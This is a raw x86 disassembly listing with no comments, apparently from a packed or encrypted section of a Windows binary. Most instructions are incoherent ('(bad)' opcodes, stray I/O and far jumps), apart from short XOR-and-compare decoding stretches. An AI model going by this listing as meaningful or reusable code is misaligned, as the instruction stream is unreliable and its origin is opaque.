  40adfe:	lea    ecx,[esi+0x3d0fbdb]
  40ae04:	dec    esi
  40ae05:	or     ecx,edi
  40ae07:	xchg   edx,eax
  40ae08:	lahf   
  40ae09:	sbb    DWORD PTR [ecx+0x472956bf],ebp
  40ae0f:	cwde   
  40ae10:	js     0x40ae13
  40ae12:	add    BYTE PTR [ecx+0x5492c0fc],cl
  40ae18:	neg    DWORD PTR [esp+edx*1]
  40ae1b:	mov    al,ds:0xb4875f3f
  40ae20:	sbb    dh,BYTE PTR [eax-0x57]
  40ae23:	mov    ah,BYTE PTR [eax+0x50]
  40ae26:	lahf   
  40ae27:	dec    esp
  40ae28:	xchg   ecx,eax
  40ae29:	pop    es
  40ae2a:	adc    eax,0xf1dea5db
  40ae2f:	je     0x40ae42
  40ae31:	int    0x87
  40ae33:	pushf  
  40ae34:	cmp    al,0x3f
  40ae36:	and    esi,DWORD PTR [ebp-0x5b]
  40ae39:	or     ebp,eax
  40ae3b:	lock mov dh,0xb6
  40ae3e:	adc    eax,0x2b3502cf
  40ae43:	out    0x23,eax
  40ae45:	(bad)  
  40ae46:	mul    DWORD PTR [ebp-0x22c3e91b]
  40ae4c:	addr16 in al,dx
  40ae4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae4f:	jge    0x40aeb6
  40ae51:	push   esi
  40ae52:	(bad)  
  40ae53:	jl     0x40ae7e
  40ae55:	(bad)  
  40ae56:	iret   
  40ae57:	jecxz  0x40ae1d
  40ae59:	mov    edi,0x99548086
  40ae5e:	popf   
  40ae5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae60:	mov    ebp,0xe404b64a
  40ae65:	pop    ebx
  40ae66:	add    DWORD PTR [ecx-0x72],0xc6871034
  40ae6d:	clc    
  40ae6e:	loopne 0x40ae6d
  40ae70:	push   es
  40ae71:	cs (bad) 
  40ae73:	xor    BYTE PTR [esi-0x50],dl
  40ae76:	jmp    0x40ae41
  40ae78:	add    esi,esi
  40ae7a:	sub    BYTE PTR [ebx+eax*1-0x456573e0],bh
  40ae81:	and    edi,0x18
  40ae84:	das    
  40ae85:	mov    DWORD PTR [esp+edi*2-0x53c112be],ecx
  40ae8c:	dec    ecx
  40ae8d:	(bad)  
  40ae8e:	lahf   
  40ae8f:	mov    edx,0xb354352
  40ae94:	dec    esi
  40ae95:	je     0x40af09
  40ae97:	retf   0xb37
  40ae9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae9b:	push   0xffffffa0
  40ae9d:	cdq    
  40ae9e:	hlt    
  40ae9f:	mov    dl,0x6e
  40aea1:	mov    BYTE PTR [esi+ecx*4-0x79],bl
  40aea5:	xadd   DWORD PTR [edx],eax
  40aea8:	push   ebx
  40aea9:	stos   BYTE PTR es:[edi],al
  40aeaa:	mov    dh,0x64
  40aeac:	adc    ecx,edx
  40aeae:	out    0xc5,eax
  40aeb0:	cdq    
  40aeb1:	cmp    al,0x2d
  40aeb3:	clc    
  40aeb4:	(bad)  
  40aeb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aeb6:	(bad)  [ebp-0x6b2b47e0]
  40aebc:	cli    
  40aebd:	mov    ebp,0xc85ef99c
  40aec2:	mov    dl,bh
  40aec4:	cmp    bh,bh
  40aec6:	(bad)  
  40aec7:	mov    ds:0x74cf6976,al
  40aecc:	retf   0xfb93
  40aecf:	sub    ebx,DWORD PTR [esi]
  40aed1:	cmc    
  40aed2:	mov    BYTE PTR [ecx+ebx*2+0x7b],bh
  40aed6:	jbe    0x40ae76
  40aed8:	xchg   edx,eax
  40aed9:	or     dl,BYTE PTR [edx-0x4ec6c2a7]
  40aedf:	xor    BYTE PTR [esi],ah
  40aee1:	cmp    dh,ch
  40aee3:	pop    esp
  40aee4:	fimul  WORD PTR [ecx-0x3a]
  40aee7:	lds    esi,FWORD PTR [ecx]
  40aee9:	and    eax,0xc7e7c674
  40aeee:	mov    bl,0x71
  40aef0:	push   ecx
  40aef1:	cmp    ah,BYTE PTR [ebx+0x6f3b94ed]
  40aef7:	aad    0xaf
  40aef9:	cmp    DWORD PTR [ecx+0x497e2c72],ebp
  40aeff:	or     edi,DWORD PTR [ecx-0x773a7bbe]
  40af05:	mov    DWORD PTR [ecx-0x6365ac43],edi
  40af0b:	jp     0x40af20
  40af0d:	pusha  
  40af0e:	xchg   edx,eax
  40af0f:	pop    es
  40af10:	jl     0x40aea4
  40af12:	ror    BYTE PTR [edi-0x63],1
  40af15:	push   ds
  40af16:	or     bh,BYTE PTR [ecx]
  40af18:	and    cl,ch
  40af1a:	cs idiv BYTE PTR ss:[edi-0x71]
  40af1f:	mov    DWORD PTR [ebp+0x5f816d08],ecx
  40af25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af26:	push   esi
  40af27:	push   edx
  40af28:	xlat   BYTE PTR ds:[ebx]
  40af29:	scas   eax,DWORD PTR es:[edi]
  40af2a:	or     dh,ah
  40af2c:	jne    0x40af74
  40af2e:	inc    edx
  40af2f:	pop    ebp
  40af30:	sub    eax,0x2b16ed18
  40af35:	or     eax,0x7b8a7793
  40af3a:	aam    0xe7
  40af3c:	pop    ss
  40af3d:	lock add ebp,DWORD PTR [edx]
  40af40:	loope  0x40aee7
  40af42:	jp     0x40aecd
  40af44:	data16 jle 0x40afae
  40af47:	loop   0x40af74
  40af49:	xor    eax,0x5dd09356
  40af4e:	scas   al,BYTE PTR es:[edi]
  40af4f:	or     ebp,edx
  40af51:	add    bl,dh
  40af53:	cld    
  40af54:	mov    ch,0x54
  40af56:	shl    BYTE PTR [ebx+0x19],1
  40af59:	rcl    BYTE PTR [edi],cl
  40af5b:	push   edx
  40af5c:	imul   ebp,DWORD PTR [esi+0x2581680b],0xffffffdf
  40af63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af64:	jae    0x40af28
  40af66:	xor    ebp,esi
  40af68:	mov    dh,0x23
  40af6a:	pop    ebx
  40af6b:	xchg   edx,eax
  40af6c:	cli    
  40af6d:	pop    edi
  40af6e:	adc    DWORD PTR [esi],ebx
  40af70:	inc    edi
  40af71:	pop    ebx
  40af72:	ror    DWORD PTR [eax-0x702331b4],0x62
  40af79:	(bad)  
  40af7a:	fstp   TBYTE PTR [edx+0x3e9c6885]
  40af80:	imul   ebp,DWORD PTR [esi-0x67],0xec360578
  40af87:	xor    al,0x37
  40af89:	xor    eax,0x6788f40c
  40af8e:	lods   eax,DWORD PTR ds:[esi]
  40af8f:	sbb    al,0x2c
  40af91:	in     al,dx
  40af92:	xor    eax,0xac30ba0e
  40af97:	(bad)  
  40af98:	in     al,dx
  40af99:	je     0x40af5e
  40af9b:	jl     0x40afef
  40af9d:	loop   0x40afa2
  40af9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afa0:	je     0x40afcd
  40afa2:	jge    0x40afd9
  40afa4:	lds    ebx,FWORD PTR [edx]
  40afa6:	icebp  
  40afa7:	jbe    0x40b004
  40afa9:	dec    esi
  40afaa:	fstp   QWORD PTR [esi]
  40afac:	add    al,0xda
  40afae:	stos   DWORD PTR es:[edi],eax
  40afaf:	or     DWORD PTR [ecx],edi
  40afb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40afb2:	outs   dx,DWORD PTR ds:[esi]
  40afb3:	ja     0x40b008
  40afb5:	jg     0x40af97
  40afb7:	sar    DWORD PTR [edx+eax*4+0x6b17e57c],cl
  40afbe:	push   edi
  40afbf:	gs add bh,ch
  40afc2:	scas   al,BYTE PTR es:[edi]
  40afc3:	inc    ecx
  40afc4:	mov    al,0x84
  40afc6:	stos   BYTE PTR es:[edi],al
  40afc7:	sub    ebp,DWORD PTR [edx+0x22]
  40afca:	and    BYTE PTR [esi-0x54],cl
  40afcd:	out    0x89,eax
  40afcf:	pop    ebp
  40afd0:	hlt    
  40afd1:	mov    eax,DWORD PTR [eax]
  40afd3:	mov    cx,WORD PTR [ebp-0x4]
  40afd7:	movzx  ecx,cx
  40afda:	add    ecx,DWORD PTR [eax]
  40afdc:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40afe3:	mov    DWORD PTR [ebp-0x1c],ecx
  40afe6:	jmp    0x40b333
  40afeb:	js     0x40b055
  40afed:	adc    ebp,ebx
  40afef:	jae    0x40b062
  40aff1:	loopne 0x40b05c
  40aff3:	lfs    esi,FWORD PTR [edx]
  40aff6:	or     al,cl
  40aff8:	(bad)  
  40aff9:	out    0xf6,al
  40affb:	jns    0x40afe5
  40affd:	jle    0x40b07d
  40afff:	cs jge 0x40b080
  40b002:	jle    0x40b06e
  40b004:	into   
  40b005:	inc    ecx
  40b006:	inc    esp
  40b007:	leave  
  40b008:	ins    DWORD PTR es:[edi],dx
  40b009:	jne    0x40b056
  40b00b:	shl    DWORD PTR [esi-0x4da5e47f],cl
  40b011:	dec    edi
  40b012:	add    al,0xad
  40b014:	sbb    al,0x83
  40b016:	cwde   
  40b017:	popf   
  40b018:	(bad)  
  40b019:	adc    al,0xc7
  40b01b:	rol    DWORD PTR [ecx+0x4a],cl
  40b01e:	sbb    al,0xc8
  40b020:	fs dec esi
  40b022:	and    DWORD PTR [ebx+eiz*1],0x2ae7f916
  40b029:	mov    bh,0x39
  40b02b:	cmp    BYTE PTR [esi-0x7c9acf26],bl
  40b031:	cdq    
  40b032:	push   cs
  40b033:	pop    ss
  40b034:	or     DWORD PTR [edi-0xd00a890],esi
  40b03a:	and    al,0xd9
  40b03c:	sbb    eax,0x905aee30
  40b041:	lahf   
  40b042:	push   edx
  40b043:	cli    
  40b044:	pop    esi
  40b045:	fnclex 
  40b047:	adc    BYTE PTR [ebp+0xe],al
  40b04a:	add    edi,DWORD PTR [ecx]
  40b04c:	mov    bl,0x97
  40b04e:	and    BYTE PTR [edi+ebx*8+0x41],bh
  40b052:	(bad)  
  40b053:	and    esi,DWORD PTR [eax+0x4955ef0a]
  40b059:	idiv   BYTE PTR [ecx-0x7b]
  40b05c:	mov    al,BYTE PTR [edi+0x42]
  40b05f:	jge    0x40b042
  40b061:	cs es jg 0x40b0a4
  40b065:	je     0x40b076
  40b067:	popf   
  40b068:	push   ebx
  40b069:	mov    ch,0xf3
  40b06b:	add    ebx,ebp
  40b06d:	mov    edi,0x51280634
  40b072:	xchg   BYTE PTR [edx-0x11f437af],dh
  40b078:	add    esi,DWORD PTR [ecx]
  40b07a:	push   ebx
  40b07b:	in     eax,0xe5
  40b07d:	sub    eax,0x56b26735
  40b082:	dec    ebp
  40b083:	mov    DWORD PTR [edx+0x64b64448],eax
  40b089:	cwde   
  40b08a:	sub    al,al
  40b08c:	ins    BYTE PTR es:[edi],dx
  40b08d:	(bad)  
  40b08e:	or     eax,0x7a6cd71a
  40b093:	add    al,0x89
  40b095:	arpl   WORD PTR [edx+0x1b549239],bx
  40b09b:	into   
  40b09c:	(bad)  
  40b09d:	xor    al,0x68
  40b09f:	js     0x40b02c
  40b0a1:	out    dx,al
  40b0a2:	xchg   ebp,eax
  40b0a3:	jno    0x40b0d2
  40b0a5:	iret   
  40b0a6:	or     al,0xbf
  40b0a8:	retf   0x5bd2
  40b0ab:	outs   dx,DWORD PTR ds:[esi]
  40b0ac:	cmp    DWORD PTR [ecx-0x672d8de6],esp
  40b0b2:	retf   
  40b0b3:	cmp    DWORD PTR [ebx],ebx
  40b0b5:	jg     0x40b074
  40b0b7:	adc    bh,al
  40b0b9:	test   eax,0xb593a89e
  40b0be:	fchs   
  40b0c0:	inc    BYTE PTR fs:[ecx+0x42677180]
  40b0c7:	sar    edi,0x77
  40b0ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b0cb:	xor    esi,DWORD PTR [esi]
  40b0cd:	clc    
  40b0ce:	jmp    0x5827510d
  40b0d3:	sbb    al,BYTE PTR [esi+0x72a8c624]
  40b0d9:	clc    
  40b0da:	adc    DWORD PTR [edx+0x10fc9486],0x36
  40b0e1:	mov    edi,0xc977e7a8
  40b0e6:	das    
  40b0e7:	add    DWORD PTR [ecx-0x682b1764],esi
  40b0ed:	and    al,0x58
  40b0ef:	adc    ebp,DWORD PTR [edx]
  40b0f1:	arpl   si,bp
  40b0f3:	test   BYTE PTR ds:0xd409fdfc,ch
  40b0f9:	loopne 0x40b108
  40b0fb:	or     DWORD PTR [edi+0x72a70405],0x113480b3
  40b105:	mov    al,ds:0xe4259772
  40b10a:	mov    eax,ds:0x5b7762cd
  40b10f:	xor    BYTE PTR [ebp-0x52],dh
  40b112:	xchg   edi,eax
  40b113:	imul   edx,DWORD PTR [ebx+ebp*1+0x33],0x39
  40b118:	cli    
  40b119:	jne    0x40b16e
  40b11b:	mov    ch,BYTE PTR [ebx+0x44]
  40b11e:	aaa    
  40b11f:	shr    BYTE PTR [edi+0x7bde6253],cl
  40b125:	enter  0x3fc5,0xf7
  40b129:	(bad)  
  40b12a:	cld    
  40b12b:	jge    0x40b0cf
  40b12d:	js     0x40b177
  40b12f:	cmc    
  40b130:	jns    0x40b0f8
  40b132:	xor    dh,BYTE PTR [eax+0x4]
  40b135:	cmc    
  40b136:	and    DWORD PTR [ecx-0x47],ecx
  40b139:	xor    BYTE PTR [edx+0x49d0ff2e],bh
  40b13f:	jge    0x40b0dc
  40b141:	into   
  40b142:	repnz test eax,0x450eec49
  40b148:	or     DWORD PTR [edi-0x2c43fe07],ebp
  40b14e:	out    dx,eax
  40b14f:	pop    ecx
  40b150:	sub    edi,DWORD PTR [ebp+eax*2-0x4d]
  40b154:	int3   
  40b155:	dec    esp
  40b156:	outs   dx,BYTE PTR ds:[esi]
  40b157:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b158:	outs   dx,DWORD PTR ds:[esi]
  40b159:	push   eax
  40b15a:	push   0xfffffff0
  40b15c:	int    0xa8
  40b15e:	pop    ds
  40b15f:	test   DWORD PTR [edx-0x1a153bf4],esp
  40b165:	mov    ds:0x97510fd4,ax
  40b16b:	out    0x64,al
  40b16d:	xor    ch,BYTE PTR [edi+0x32e4b258]
  40b173:	adc    al,0xcf
  40b175:	inc    esp
  40b176:	xchg   esp,eax
  40b177:	(bad)  
  40b178:	popa   
  40b179:	jae    0x40b105
  40b17b:	push   es
  40b17c:	push   cs
  40b17d:	das    
  40b17e:	iret   
  40b17f:	inc    eax
  40b180:	mov    edx,0x2be95245
  40b185:	popa   
  40b186:	lea    esi,[edx+0x30]
  40b189:	(bad)  
  40b18a:	in     al,0x66
  40b18c:	jb     0x40b176
  40b18e:	bound  ebx,QWORD PTR [ebp-0x5f]
  40b191:	stos   BYTE PTR es:[edi],al
  40b192:	hlt    
  40b193:	jmp    0x3e34ff5
  40b198:	shr    BYTE PTR cs:0xe3276f42,1
  40b19f:	(bad)  
  40b1a0:	and    esi,ebp
  40b1a2:	push   edx
  40b1a3:	clc    
  40b1a4:	push   edx
  40b1a5:	ds out dx,eax
  40b1a7:	fdiv   st,st(3)
  40b1a9:	lahf   
  40b1aa:	mov    ch,0x47
  40b1ac:	mul    ebx
  40b1ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1af:	fsub   QWORD PTR [ebx-0x6969dc1f]
  40b1b5:	sub    BYTE PTR [ebp+ebx*4+0x1d09ae76],dl
  40b1bc:	jne    0x40b1b7
  40b1be:	sbb    BYTE PTR [esi+0x75cdba9],0xae
  40b1c5:	cmp    dh,BYTE PTR [edi-0x237512dd]
  40b1cb:	mov    al,0xe2
  40b1cd:	data16 outs dx,BYTE PTR ds:[esi]
  40b1cf:	call   0xee4b6da7
  40b1d4:	inc    esi
  40b1d5:	xchg   edx,eax
  40b1d6:	cmp    BYTE PTR [edx+0x32e1449d],dl
  40b1dc:	lock mov DWORD PTR [edi],edi
  40b1df:	(bad)  
  40b1e0:	imul   esp,DWORD PTR [ebx+ebp*8-0x64],0xffffffe0
  40b1e5:	jne    0x40b1c7
  40b1e7:	and    bl,BYTE PTR [ebx+0x383f9464]
  40b1ed:	adc    al,0x98
  40b1ef:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40b1f1:	xor    esp,ecx
  40b1f3:	jge    0x40b183
  40b1f5:	outs   dx,BYTE PTR ds:[esi]
  40b1f6:	mov    ah,0xe
  40b1f8:	sbb    edi,DWORD PTR [eax]
  40b1fa:	leave  
  40b1fb:	jmp    0x99cc:0xc310f6de
  40b202:	jle    0x40b20c
  40b204:	addr16 sahf 
  40b206:	push   0xffffffa8
  40b208:	fld    DWORD PTR [ebp-0x6120a55d]
  40b20e:	jnp    0x40b192
  40b210:	push   esi
  40b211:	xor    eax,0x350b3a86
  40b216:	retf   0xfa05
  40b219:	cmc    
  40b21a:	scas   al,BYTE PTR es:[edi]
  40b21b:	pop    edi
  40b21c:	fldenv [edx-0x3b]
  40b21f:	cmp    ah,BYTE PTR [edx]
  40b221:	scas   al,BYTE PTR es:[edi]
  40b222:	nop
  40b223:	aas    
  40b224:	and    DWORD PTR [edx+ebp*2+0x2d311990],0x64
  40b22c:	fnclex 
  40b22e:	call   0x30cd:0xdf330e7b
  40b235:	adc    DWORD PTR ss:[edi-0x5c],edi
  40b239:	lds    esi,FWORD PTR [ecx+0x25]
  40b23c:	inc    edx
  40b23d:	sti    
  40b23e:	jge    0x40b258
  40b240:	stos   DWORD PTR es:[edi],eax
  40b241:	imul   ebp,DWORD PTR [edx],0x7df3d10b
  40b247:	enter  0x5c34,0x49
  40b24b:	mov    al,ds:0x31081e6c
  40b250:	sti    
  40b251:	sbb    DWORD PTR [ebx+0x4b],0x24
  40b255:	and    BYTE PTR [edx],ah
  40b257:	rcr    DWORD PTR [eax],cl
  40b259:	xor    dh,BYTE PTR [esi+ebp*8]
  40b25c:	push   0x21803b3d
  40b261:	mov    bh,0x9c
  40b263:	test   al,0xc5
  40b265:	test   bl,cl
  40b267:	fmul   DWORD PTR [esi]
  40b269:	aam    0xa8
  40b26b:	iret   
  40b26c:	dec    eax
  40b26d:	retf   
  40b26e:	inc    edx
  40b26f:	(bad)  
  40b270:	jb     0x40b2b6
  40b272:	jns    0x40b226
  40b274:	pop    edx
  40b275:	push   edx
  40b276:	or     DWORD PTR [edi-0x17],esp
  40b279:	jp     0x40b22a
  40b27b:	in     al,0x4
  40b27d:	xlat   BYTE PTR ds:[ebx]
  40b27e:	repnz dec esi
  40b280:	sar    al,cl
  40b282:	xor    bl,cl
  40b284:	add    ecx,DWORD PTR [esi+0x2cbad7a1]
  40b28a:	pop    ds
  40b28b:	fwait
  40b28c:	xchg   bl,dl
  40b28e:	les    esi,FWORD PTR [ebx]
  40b290:	addr16 jmp 0x78ae:0xefeb000d
  40b298:	jecxz  0x40b22d
  40b29a:	adc    eax,0x16c3ca4e
  40b29f:	adc    BYTE PTR [esi-0x3c9d163a],ah
  40b2a5:	clc    
  40b2a6:	call   FWORD PTR [edi+0x15]
  40b2a9:	push   0xfb0b52a1
  40b2ae:	lahf   
  40b2af:	mov    cl,BYTE PTR [eax]
  40b2b1:	shr    DWORD PTR [esi-0x25a9610c],0xe7
  40b2b8:	sbb    edi,DWORD PTR [ebx]
  40b2ba:	rcr    DWORD PTR [edx+ecx*1+0x33808677],1
  40b2c1:	and    DWORD PTR ds:0x42ca1cb1,0xae89234e
  40b2cb:	nop
  40b2cc:	dec    esp
  40b2cd:	pushf  
  40b2ce:	lds    eax,FWORD PTR [ebx+0x41]
  40b2d1:	fcom   DWORD PTR [ebx+0x5]
  40b2d4:	leave  
  40b2d5:	push   ebp
  40b2d6:	xchg   esi,eax
  40b2d7:	mov    ah,0x79
  40b2d9:	stos   BYTE PTR es:[edi],al
  40b2da:	int3   
  40b2db:	sbb    al,0x54
  40b2dd:	leave  
  40b2de:	xchg   BYTE PTR [ebx-0x55],bh
  40b2e1:	ficom  WORD PTR [ebx+ebp*1+0x36]
  40b2e5:	int    0x36
  40b2e7:	add    bh,BYTE PTR [edi+ecx*8-0x38c92c12]
  40b2ee:	addr16 (bad) 
  40b2f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2f1:	rcl    BYTE PTR ds:[eax-0x733ab6b4],cl
  40b2f8:	mov    ?,ecx
  40b2fa:	int3   
  40b2fb:	mov    edx,0x8c4dad12
  40b300:	mov    cl,BYTE PTR [ebx-0xe]
  40b303:	sub    al,0x61
  40b305:	or     ah,BYTE PTR [eax-0x7c]
  40b308:	test   al,0x27
  40b30a:	jmp    0x40b299
  40b30c:	jp     0x40b30d
  40b30e:	pop    es
  40b30f:	inc    ebp
  40b310:	fbstp  TBYTE PTR [edi]
  40b312:	jns    0x40b366
  40b314:	jns    0x40b321
  40b316:	mov    al,0x73
  40b318:	dec    ebp
  40b319:	sub    al,0xae
  40b31b:	mov    ds:0xa2ee23a8,eax
  40b320:	call   0xd01f:0x6315bf8b
  40b327:	jns    0x40b367
  40b329:	cwde   
  40b32a:	daa    
  40b32b:	imul   edx,DWORD PTR [esi+0x0],0xc594c940
  40b332:	test   BYTE PTR [ebx+0x4d8b0845],cl
  40b338:	clc    
  40b339:	xor    eax,esi
  40b33b:	add    eax,edi
  40b33d:	cmp    DWORD PTR [ecx],eax
  40b33f:	jne    0x40c44a
  40b345:	mov    eax,DWORD PTR [ebp+0x8]
  40b348:	mov    ecx,DWORD PTR [ebp-0x1c]
  40b34b:	xor    eax,esi
  40b34d:	add    eax,edi
  40b34f:	cmp    DWORD PTR [ecx],eax
  40b351:	jne    0x40b6c1
  40b357:	mov    eax,DWORD PTR [ebp+0x8]
  40b35a:	mov    ecx,DWORD PTR [ebp-0x10]
  40b35d:	xor    eax,esi
  40b35f:	add    eax,edi
  40b361:	mov    DWORD PTR [ecx],eax
  40b363:	jmp    0x40b6b0
  40b368:	cmp    eax,0xe9fdcd2a
  40b36d:	pop    ecx
  40b36e:	dec    ebp
  40b36f:	push   0x46
  40b371:	aam    0xcc
  40b373:	int3   
  40b374:	sub    al,dl
  40b376:	fsub   st,st(6)
  40b378:	sub    edi,esi
  40b37a:	jle    0x40b3fa
  40b37c:	cs jge 0x40b3fd
  40b37f:	jle    0x40b33d
  40b381:	jnp    0x40b3ae
  40b383:	ror    DWORD PTR [edx-0x28],0x6a
  40b387:	jecxz  0x40b346
  40b389:	jg     0x40b3d4
  40b38b:	inc    ecx
  40b38c:	inc    esi
  40b38d:	lock add ecx,ebp
  40b390:	sbb    al,0x88
  40b392:	push   0x2d
  40b394:	aaa    
  40b395:	jmp    0x40b3b5
  40b397:	adc    bh,BYTE PTR [ebx+0x10f05275]
  40b39d:	outs   dx,BYTE PTR ds:[esi]
  40b39e:	xor    eax,0x451fe890
  40b3a3:	add    DWORD PTR ds:0x9f1dddda,ecx
  40b3a9:	in     eax,0xf6
  40b3ab:	pop    ebp
  40b3ac:	and    bh,ah
  40b3ae:	scas   al,BYTE PTR es:[edi]
  40b3af:	pop    es
  40b3b0:	cmp    eax,0xdc93b0ee
  40b3b5:	stc    
  40b3b6:	cli    
  40b3b7:	jo     0x40b37b
  40b3b9:	mov    bh,0xba
  40b3bb:	push   cs
  40b3bc:	cmc    
  40b3bd:	mov    DWORD PTR [eax],edx
  40b3bf:	sahf   
  40b3c0:	inc    edi
  40b3c1:	jb     0x40b3c8
  40b3c3:	inc    esi
  40b3c4:	(bad)  
  40b3c5:	int    0x4c
  40b3c7:	inc    ecx
  40b3c8:	arpl   WORD PTR cs:[ebx+0x66],di
  40b3cc:	(bad)  
  40b3cd:	mov    esi,0x4cc49235
  40b3d2:	jge    0x40b3b4
  40b3d4:	cwde   
  40b3d5:	cmp    BYTE PTR [edx],cl
  40b3d7:	scas   al,BYTE PTR es:[edi]
  40b3d8:	mov    eax,ds:0x82b47f67
  40b3dd:	loop   0x40b42d
  40b3df:	adc    bh,bl
  40b3e1:	jl     0x40b398
  40b3e3:	std    
  40b3e4:	fisttp DWORD PTR [edx-0x6a]
  40b3e7:	inc    ecx
  40b3e8:	adc    BYTE PTR [ecx],bl
  40b3ea:	xlat   BYTE PTR ds:[ebx]
  40b3eb:	test   eax,0xc5305b2
  40b3f0:	fcomp  DWORD PTR [esi]
  40b3f2:	cld    
  40b3f3:	jmp    0xecdec337
  40b3f8:	sbb    ah,BYTE PTR [edi]
  40b3fa:	nop
  40b3fb:	enter  0xa683,0xbf
  40b3ff:	cmp    eax,0xbb40cf72
  40b404:	pop    edx
  40b405:	and    esp,0xe9bf3660
  40b40b:	mov    bh,0x7
  40b40d:	xor    al,0xc2
  40b40f:	enter  0xdbfd,0xd1
  40b413:	gs xchg esp,eax
  40b415:	dec    esp
  40b416:	inc    ebx
  40b417:	in     al,0x43
  40b419:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b41a:	pop    esp
  40b41b:	jl     0x40b3a6
  40b41d:	js     0x40b3e0
  40b41f:	sahf   
  40b420:	data16 jo 0x40b405
  40b423:	mov    ds:0x4a585701,al
  40b428:	sub    ebp,edi
  40b42a:	imul   ecx,DWORD PTR [edi-0x14c73894],0x51f92400
  40b434:	jno    0x40b46e
  40b436:	add    eax,0xc2e83b1c
  40b43b:	fisub  WORD PTR [edi-0x74]
  40b43e:	adc    cl,BYTE PTR [ebx-0x537b5493]
  40b444:	ss dec edi
  40b446:	stc    
  40b447:	jb     0x40b414
  40b449:	mov    ecx,0xab5e1b9b
  40b44e:	cld    
  40b44f:	add    eax,0x4119c8ac
  40b454:	mov    ebx,0x5f86fccf
  40b459:	test   al,0x52
  40b45b:	xchg   dh,bh
  40b45d:	mov    ecx,0xf6a900b3
  40b462:	aas    
  40b463:	pop    ebx
  40b464:	fiadd  WORD PTR [ebp+0x2]
  40b467:	xor    BYTE PTR [edx+0x2c8b6748],0xcc
  40b46e:	shl    BYTE PTR [eax-0x2d],1
  40b471:	ja     0x40b414
  40b473:	jmp    0x40b44b
  40b475:	xchg   edi,eax
  40b476:	loop   0x40b41b
  40b478:	cs test eax,0x41ff9231
  40b47e:	or     DWORD PTR [esi+0x2c0fd93f],ebx
  40b484:	js     0x40b4b7
  40b486:	(bad)  
  40b487:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b488:	xor    eax,ebp
  40b48a:	adc    al,0x8f
  40b48c:	(bad)  
  40b48d:	addr16 in eax,0xb9
  40b490:	ja     0x40b4b1
  40b492:	xchg   esp,eax
  40b493:	xchg   ebp,eax
  40b494:	add    al,0x4e
  40b496:	dec    ebx
  40b497:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b498:	outs   dx,DWORD PTR ds:[esi]
  40b499:	daa    
  40b49a:	add    al,0xd8
  40b49c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b49d:	hlt    
  40b49e:	aas    
  40b49f:	cmp    BYTE PTR [ecx],ch
  40b4a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4a2:	xor    eax,0x4e787c04
  40b4a7:	daa    
  40b4a8:	mov    eax,ds:0x8f30eac9
  40b4ad:	aaa    
  40b4ae:	mov    eax,0x11b860f1
  40b4b3:	push   ds
  40b4b4:	ret    0x25ba
  40b4b7:	sub    edi,DWORD PTR [edi+0x5e]
  40b4ba:	xor    DWORD PTR [ecx+0x75b1a83d],ecx
  40b4c0:	and    ecx,DWORD PTR [ebx]
  40b4c2:	push   0xffffffd5
  40b4c4:	repnz pop ss
  40b4c6:	xor    edi,esp
  40b4c8:	or     esp,ebp
  40b4ca:	and    bl,dl
  40b4cc:	(bad)  
  40b4ce:	popf   
  40b4cf:	test   eax,0xbcf871c1
  40b4d4:	or     bl,BYTE PTR [edx+0xf]
  40b4d7:	inc    edi
  40b4d8:	mov    ecx,0x70e7ed1e
  40b4dd:	xchg   DWORD PTR [edi-0x2a],ebx
  40b4e0:	pop    eax
  40b4e1:	add    edi,DWORD PTR [ebx+0x5b40bf17]
  40b4e7:	sub    BYTE PTR [edx],bh
  40b4e9:	mov    ah,0x2c
  40b4eb:	cmp    dl,BYTE PTR [bx+si+0x6]
  40b4ef:	es push eax
  40b4f1:	jne    0x40b48d
  40b4f3:	repnz xchg ebx,eax
  40b4f5:	pop    edi
  40b4f6:	or     esp,eax
  40b4f8:	stos   BYTE PTR es:[edi],al
  40b4f9:	sti    
  40b4fa:	pop    edi
  40b4fb:	push   esi
  40b4fc:	sub    BYTE PTR [ebx-0x6e],0xe0
  40b500:	add    al,0x7e
  40b502:	mov    eax,0x5938580
  40b507:	or     ebx,edx
  40b509:	sub    BYTE PTR ds:0xf9130458,al
  40b50f:	mov    esp,0x33a3030f
  40b514:	pop    ss
  40b515:	in     eax,0x0
  40b517:	scas   al,BYTE PTR es:[edi]
  40b518:	adc    al,0x7f
  40b51a:	add    al,0xe7
  40b51c:	ror    cl,cl
  40b51e:	repz fist DWORD PTR ds:0xaedc19fa
  40b525:	and    BYTE PTR [edx+0x76],bl
  40b528:	and    DWORD PTR [eax],ebx
  40b52a:	mov    ecx,edx
  40b52c:	sbb    DWORD PTR [edi+0xa70029d],0x4e
  40b533:	retf   
  40b534:	clc    
  40b535:	pop    ecx
  40b536:	push   0xffffffeb
  40b538:	test   BYTE PTR [edi+0x68],al
  40b53b:	shr    DWORD PTR [edx+0x144e49c1],cl
  40b541:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b542:	or     dl,dh
  40b544:	push   esp
  40b545:	pop    esi
  40b546:	lock stc 
  40b548:	aas    
  40b549:	add    DWORD PTR [esp+ebp*8+0x42],ebp
  40b54d:	dec    ebp
  40b54e:	in     eax,0xb2
  40b550:	inc    eax
  40b551:	sbb    edx,ecx
  40b553:	push   edx
  40b554:	(bad)  
  40b555:	pop    ss
  40b556:	test   DWORD PTR [edx],esp
  40b558:	jmp    0x40b579
  40b55a:	adc    dl,BYTE PTR [edx-0x26]
  40b55d:	pushf  
